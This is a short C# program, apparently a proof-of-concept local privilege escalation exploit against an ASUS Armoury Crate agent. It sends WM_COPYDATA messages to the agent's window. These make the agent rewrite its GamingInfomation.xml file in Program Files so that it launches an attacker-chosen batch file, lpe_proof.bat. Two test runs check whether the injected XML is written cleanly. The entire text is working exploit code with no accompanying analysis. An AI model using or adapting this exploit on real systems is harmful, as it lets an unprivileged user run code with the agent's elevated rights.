using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class DiagGaming {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr FindWindow(string c, string n);
    [DllImport("user32.dll")]
    static extern IntPtr SendMessage(IntPtr h, uint m, IntPtr w, ref CDS l);
    [StructLayout(LayoutKind.Sequential)]
    struct CDS { public UIntPtr d; public uint cb; public IntPtr lp; }

    static void Send(IntPtr hwnd, int cmdId, byte[] data, uint cbData) {
        IntPtr p = Marshal.AllocHGlobal(data.Length + 16);
        for (int i = 0; i < data.Length + 16; i++) Marshal.WriteByte(p, i, 0);
        Marshal.Copy(data, 0, p, data.Length);
        CDS cds = new CDS { d = (UIntPtr)cmdId, cb = cbData, lp = p };
        IntPtr r = SendMessage(hwnd, 0x4A, IntPtr.Zero, ref cds);
        Console.WriteLine("  Send cmdId=" + cmdId + " cbData=" + cbData + " result=" + r);
        Marshal.FreeHGlobal(p);
    }

    static void Main() {
        string gamingFile = @"C:\Program Files (x86)\ASUS\ArmouryDevice\dll\SwAgent\GamingInfomation.xml";
        string xml = "<root><launch_program><link>C:\\ProgramData\\ASUS\\lpe_proof.bat</link></launch_program></root>";
        byte[] data = Encoding.Unicode.GetBytes(xml);

        IntPtr hwnd = FindWindow("ArmourySwAgentClass", "ArmourySwAgentName");
        Console.WriteLine("hwnd=0x" + hwnd.ToString("X") + " xmlBytes=" + data.Length);

        // Test 1: cbData = exact length (no null) — expect garbage
        Console.WriteLine("\n[TEST1] cbData=len (no null):");
        Send(hwnd, 161, data, (uint)data.Length);
        Thread.Sleep(600);
        var f = new FileInfo(gamingFile);
        Console.WriteLine("  File size=" + f.Length + " (expected garbage=192)");

        // Test 2: cbData = len+2 (include null) — expect clean
        Console.WriteLine("\n[TEST2] cbData=len+2 (with null):");
        Send(hwnd, 161, data, (uint)(data.Length + 2));
        Thread.Sleep(600);
        f.Refresh();
        Console.WriteLine("  File size=" + f.Length);
        byte[] bytes = File.ReadAllBytes(gamingFile);
        string content = Encoding.Unicode.GetString(bytes, 2, bytes.Length - 2);
        Console.WriteLine("  Content=[" + content + "]");
        Console.WriteLine("  Clean=" + content.Equals(xml));
    }
}
